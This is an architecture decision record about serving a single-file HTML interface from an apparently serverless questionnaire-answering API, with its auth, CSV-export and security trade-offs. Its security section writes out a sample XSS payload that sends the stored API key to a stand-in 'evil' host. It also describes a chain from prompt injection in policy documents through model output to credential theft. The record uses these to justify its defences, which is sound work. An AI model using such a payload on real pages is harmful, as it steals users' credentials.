# ADR-0018: A page a person can use, served by the API itself

**Status:** Accepted
**Date:** 2026-09-07

## Context

Week 5 deliberately shipped no UI (`docs/weeks/WEEK5.md`, and the decision was mine). The
argument was that three interfaces already existed — HTTP, an SDK, and MCP — and that a
fourth would be presentation rather than engineering.

Testing the deployed system as a real user would is what changed the argument. Driving a
questionnaire through Swagger UI means copying a job id between five collapsible sections and
re-clicking Execute to poll. It works, and nobody who is not the author would do it. Worse,
three things were missing that only became visible by trying:

- **The interactive docs could not authenticate.** The key was declared as a plain `Header`,
  so it never reached the OpenAPI document and `/docs` had no Authorize button. Every call
  from the docs returned 401, which reads as a broken API rather than a protected one.
- **The completed questionnaire could not come back out.** CSV export existed only in the
  local batch CLI. The deployed API could answer 17 questions and had no way to hand back the
  one artifact a customer actually wants.
- **A refusal looked like a failure.** In raw JSON, `"answerable": false` sits next to
  `"status": "needs_review"` and reads as an error. It is the product working.

## Decision

One HTML file, served by the API at `/ui`.

```
GET /ui ─▶ src/api/ui.html, no build step, no npm, no dependency
  ↘ same origin as the API ─▶ nothing to configure for CORS
    ↘ key typed into the page, held in sessionStorage for that tab only
      ↘ upload ─▶ poll ─▶ approve/reject inline ─▶ download CSV
```

Plus the two gaps it exposed: `APIKeyHeader` declared as a security scheme so `/docs` can
authorise, and `GET /questionnaires/{job}/export.csv` reusing `csv_safe` from the batch
exporter rather than reimplementing it.

Refused answers render grey, not red. Colour is the fastest thing a reader parses, and
teaching someone that a refusal is a fault would undo the work the verifier does.

## The security consequence, which is the real content of this decision

The page renders text a model wrote after reading policy documents the operator does not
control. That is the same untrusted input as THREAT-MODEL T1, arriving at a new surface.

A document carrying `<img onerror="fetch('https://evil/?k='+sessionStorage.grc_key)">` would,
in a page built with `innerHTML`, run that script **in the page holding the API key**. Prompt
injection to cross-site scripting to credential theft, with no user interaction.

Two defences, because the first one is a discipline and disciplines lapse:

1. Every value from the API goes through `textContent`. A test greps `ui.html` for
   `innerHTML`, `insertAdjacentHTML`, `document.write` and `eval(` and fails the build.
2. A `Content-Security-Policy` header on the response. `connect-src 'self'` is the one that
   matters — if markup ever did execute, it still could not post the key to another host.
   `frame-ancestors 'none'` stops the page being framed for clickjacking.

`'unsafe-inline'` is required for script and style, because the page is one file with no
build step. That is a real weakening of the CSP and it is stated here rather than hidden: the
policy stops exfiltration, not execution. Removing it means a build step, which means npm,
which is the trade the next section rejects.

## Alternatives considered

### React or Svelte, built and served from S3 + CloudFront

- **Why it's attractive:** it is what a real product does. Component state beats manual DOM
  building, and a bundler would let the CSP drop `'unsafe-inline'`.
- **Why not:** a build step, a `node_modules` tree, and a CI stage — for five boxes and one
  poll loop. It also needs CORS on the API, which is a security control I would then have to
  configure correctly, plus a CloudFront distribution at roughly $0.50/month and a 15-minute
  deploy. The whole feature is 330 lines of plain HTML.

### Streamlit or Gradio

- **Why it's attractive:** a UI in about forty lines of Python, and I already know Python.
- **Why not:** both want a long-running server. ADR-0017 chose Lambda precisely to avoid
  always-on compute, so this would mean a second deployment target for the least important
  component in the repo.

### No UI, and document the curl commands better

- **Why it's attractive:** it was the week 5 decision, and it kept the surface area small.
- **Why not:** the audience for this repo is people evaluating whether I can build a system,
  and the ones who open the link will not read `DEPLOY.md` first. More usefully, building the
  page found two genuine gaps in the API — no export, no declared auth scheme — that reading
  the OpenAPI document had not surfaced in a week.

## Consequences

- The deployed link is now openable by someone with no context. That was not true yesterday.
- `/ui` is unauthenticated, and correctly so: it is markup carrying no answer, no question and
  no key. Requiring a credential to fetch the page where the credential is entered is a loop.
- The API key now lives in browser storage on whatever machine opens the page. `sessionStorage`
  rather than `localStorage` means it dies with the tab, but this is another instance of the
  gap `COMPLIANCE.md` names first: a shared key with no identity behind it. A UI makes that
  weakness easier to reach, not worse in kind.
- Two more things the API serves and CI does not test end-to-end. The tests assert the page is
  served, is absent from the schema, carries the CSP, and contains no HTML-parsing sink — not
  that clicking Approve works. That is a documented gap, not an oversight.

## Related

- [ADR-0015](0015-three-interfaces-one-core.md) — the interfaces this is the fourth of
- [ADR-0017](0017-serverless-and-what-it-costs.md) — why there is no always-on server to host a UI
- [docs/THREAT-MODEL.md](../THREAT-MODEL.md) — T1, which this surface extends
- [docs/COMPLIANCE.md](../COMPLIANCE.md) — AC-2, the shared-key gap this makes more reachable
